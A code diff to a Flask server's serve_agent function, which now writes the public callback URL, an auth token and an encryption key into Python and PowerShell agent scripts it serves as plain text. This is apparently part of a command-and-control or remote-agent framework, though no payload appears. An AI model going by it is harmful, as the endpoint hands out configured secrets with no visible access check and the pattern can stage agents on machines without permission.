@@ -2203,13 +2203,26 @@ def server_time():
 def serve_agent(filename):
     agents_dir = BASE_DIR / "agents"
     fpath = agents_dir / filename
-    if fpath.exists() and fpath.is_file():
-        content = fpath.read_text()
-        # Use public_url for agents so they connect via external address
-        server_url = _get_public_url() or f"{request.scheme}://{request.host}"
-        content = content.replace("http://CHANGE_ME:443", server_url)
-        return Response(content, mimetype="text/plain")
-    return "Not found", 404
+    if not (fpath.exists() and fpath.is_file()):
+        return "Not found", 404
+    content = fpath.read_text()
+    server_url = _get_public_url() or f"{request.scheme}://{request.host}"
+    # Inject server URL
+    content = content.replace("http://CHANGE_ME:443", server_url)
+    # Inject auth token if configured (for Python agents)
+    token = get_config("agent_token")
+    if token:
+        content = content.replace('AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")',
+                                   f'AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "{token}")')
+        # PowerShell
+        content = content.replace('$Token   = if ($env:AUTH_TOKEN){ $env:AUTH_TOKEN } else { "" }',
+                                   f'$Token   = if ($env:AUTH_TOKEN){{ $env:AUTH_TOKEN }} else {{ "{token}" }}')
+    # Inject encryption key if configured
+    enc_key = get_config("encryption_key")
+    if enc_key:
+        content = content.replace('ENC_KEY    = os.environ.get("ENC_KEY",    "")',
+                                   f'ENC_KEY    = os.environ.get("ENC_KEY",    "{enc_key}")')
+    return Response(content, mimetype="text/plain")
 
 # ──────────────────────── API: AGENTS ────────────────────────
 
